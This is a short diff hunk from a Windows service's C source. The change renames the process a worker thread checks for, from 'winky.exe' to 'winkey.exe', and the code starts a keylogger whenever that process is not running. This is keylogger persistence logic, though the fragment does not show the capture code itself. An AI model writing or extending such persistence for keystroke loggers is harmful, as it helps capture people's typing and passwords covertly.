@@ -267,7 +267,7 @@ DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
         /*
          * Perform main service function here
          */
-        if (checkIfProccessRunning("winky.exe") == false)
+        if (checkIfProccessRunning("winkey.exe") == false)
         {
             startKeyLogger();
             Sleep(1000);
